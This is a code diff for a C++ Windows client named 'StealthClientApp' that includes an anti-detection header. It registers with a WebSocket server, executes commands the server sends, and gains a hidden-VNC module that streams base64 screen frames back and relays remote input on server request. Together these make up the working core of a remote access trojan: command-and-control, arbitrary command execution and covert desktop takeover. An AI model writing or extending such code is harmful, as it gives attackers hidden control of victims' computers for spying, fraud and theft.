@@ -11,16 +11,23 @@
 #include "system_info.h"
 #include "json_utils.h"
 #include "anti_detection.h"
+#include "hvnc_handler.h"
+#include "json.hpp"
+#include <windows.h>
+
+using json = nlohmann::json;
 
 class StealthClientApp {
 public:
     StealthClientApp() 
         : m_wsClient(std::make_unique<StealthClient::WebSocketClient>())
         , m_commandHandler(std::make_unique<StealthClient::CommandHandler>())
+        , m_hvncHandler(std::make_unique<StealthClient::HvncHandler>())
         , m_running(false)
         , m_registered(false)
     {
         SetupCallbacks();
+        SetupHvncCallbacks();
     }
 
     ~StealthClientApp() {
@@ -131,6 +138,31 @@ private:
         });
     }
 
+    void SetupHvncCallbacks() {
+        // Set frame callback to send frames via WebSocket
+        m_hvncHandler->SetFrameCallback([this](const StealthClient::FrameData& frame, const std::string& sessionId) {
+            // Encode frame data to base64
+            std::string base64Data = Base64Encode(frame.data);
+            
+            // Create frame message
+            json frameMsg;
+            frameMsg["type"] = "hvnc_frame";
+            frameMsg["sessionId"] = sessionId;
+            frameMsg["frameData"] = base64Data;
+            frameMsg["frameInfo"] = json::object();
+            frameMsg["frameInfo"]["width"] = frame.width;
+            frameMsg["frameInfo"]["height"] = frame.height;
+            frameMsg["frameInfo"]["size"] = frame.size;
+            
+            m_wsClient->SendMessage(frameMsg.dump());
+        });
+        
+        // Set send message callback
+        m_hvncHandler->SetSendMessageCallback([this](const std::string& message) {
+            m_wsClient->SendMessage(message);
+        });
+    }
+
     void SendRegistration() {
         std::string message = StealthClient::JsonUtils::CreateRegisterMessage(
             m_uuid,
@@ -164,31 +196,125 @@ private:
 
     void HandleMessage(const std::string& message) {
         try {
-            std::string type = StealthClient::JsonUtils::GetMessageType(message);
+            json msg = json::parse(message);
+            std::string type = msg.value("type", "");
 
             if (type == "register_success") {
                 std::cout << "🎉 Registration successful!" << std::endl;
                 m_registered = true;
             }
             else if (type == "error") {
-                std::string errorMsg = StealthClient::JsonUtils::GetStringField(message, "message");
+                std::string errorMsg = msg.value("message", "");
                 std::cerr << "Server error: " << errorMsg << std::endl;
             }
             else if (type == "command") {
-                std::string cmd = StealthClient::JsonUtils::GetStringField(message, "cmd");
-                std::string taskId = StealthClient::JsonUtils::GetStringField(message, "taskId");
+                std::string cmd = msg.value("cmd", "");
+                std::string taskId = msg.value("taskId", "");
                 
                 std::cout << "🎯 Received command: " << cmd << " (Task ID: " << taskId << ")" << std::endl;
                 
                 if (cmd == "execute") {
-                    std::string command = StealthClient::JsonUtils::GetStringField(message, "command");
+                    std::string command = msg.value("command", "");
                     m_commandHandler->ExecuteCommand(taskId, command);
                 }
+            }
+            else if (type == "hvnc_start") {
+                std::string sessionId = msg.value("sessionId", "");
+                json settingsJson = msg.value("settings", json::object());
+                
+                StealthClient::HvncSettings settings;
+                settings.quality = settingsJson.value("quality", "medium");
+                settings.fps = settingsJson.value("fps", 15);
+                settings.compression = settingsJson.value("compression", "high");
+                
+                std::cout << "[HVNC] Starting session: " << sessionId << std::endl;
+                
+                if (m_hvncHandler->Start(sessionId, settings)) {
+                    // Send success response
+                    json response;
+                    response["type"] = "hvnc_response";
+                    response["sessionId"] = sessionId;
+                    response["status"] = "connected";
+                    response["screenInfo"] = json::object();
+                    response["screenInfo"]["width"] = GetSystemMetrics(SM_CXSCREEN);
+                    response["screenInfo"]["height"] = GetSystemMetrics(SM_CYSCREEN);
+                    
+                    m_wsClient->SendMessage(response.dump());
+                } else {
+                    json response;
+                    response["type"] = "hvnc_response";
+                    response["sessionId"] = sessionId;
+                    response["status"] = "error";
+                    response["error"] = "Failed to start HVNC session";
+                    
+                    m_wsClient->SendMessage(response.dump());
+                }
+            }
+            else if (type == "hvnc_stop") {
+                std::string sessionId = msg.value("sessionId", "");
+                
+                std::cout << "[HVNC] Stopping session: " << sessionId << std::endl;
+                
+                m_hvncHandler->Stop();
+                
+                // Send stop response
+                json response;
+                response["type"] = "hvnc_response";
+                response["sessionId"] = sessionId;
+                response["status"] = "disconnected";
+                
+                m_wsClient->SendMessage(response.dump());
+            }
+            else if (type == "hvnc_command") {
+                std::string sessionId = msg.value("sessionId", "");
+                std::string command = msg.value("command", "");
+                json params = msg.value("params", json::object());
+                
+                std::cout << "[HVNC] Received command: " << command << std::endl;
+                
+                if (m_hvncHandler->IsActive() && m_hvncHandler->GetSessionId() == sessionId) {
+                    m_hvncHandler->HandleCommand(command, params.dump());
+                }
+            }
+            else if (type == "hvnc_screenshot") {
+                std::string sessionId = msg.value("sessionId", "");
+                
+                std::cout << "[HVNC] Screenshot requested for session: " << sessionId << std::endl;
+                
+                // Screenshot functionality would be handled by capturing a frame
+                // and sending it as a response
             }
         }
         catch (const std::exception& e) {
             std::cerr << "Error parsing message: " << e.what() << std::endl;
         }
+    }
+    
+    std::string Base64Encode(const std::vector<uint8_t>& data) {
+        static const char base64_chars[] = 
+            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        
+        std::string encoded;
+        int val = 0, valb = -6;
+        
+        for (uint8_t c : data) {
+            val = (val << 8) + c;
+            valb += 8;
+            while (valb >= 0) {
+                encoded.push_back(base64_chars[(val >> valb) & 0x3F]);
+                valb -= 6;
+            }
+        }
+        
+        if (valb > -6) {
+            encoded.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);
+        }
+        
+        while (encoded.size() % 4) {
+            encoded.push_back('=');
+        }
+        
+        return encoded;
     }
 
     void HeartbeatLoop() {
@@ -233,6 +359,7 @@ private:
 private:
     std::unique_ptr<StealthClient::WebSocketClient> m_wsClient;
     std::unique_ptr<StealthClient::CommandHandler> m_commandHandler;
+    std::unique_ptr<StealthClient::HvncHandler> m_hvncHandler;
     std::unique_ptr<std::thread> m_heartbeatThread;
     
     StealthClient::SystemInfoCollector::SystemInfo m_systemInfo;
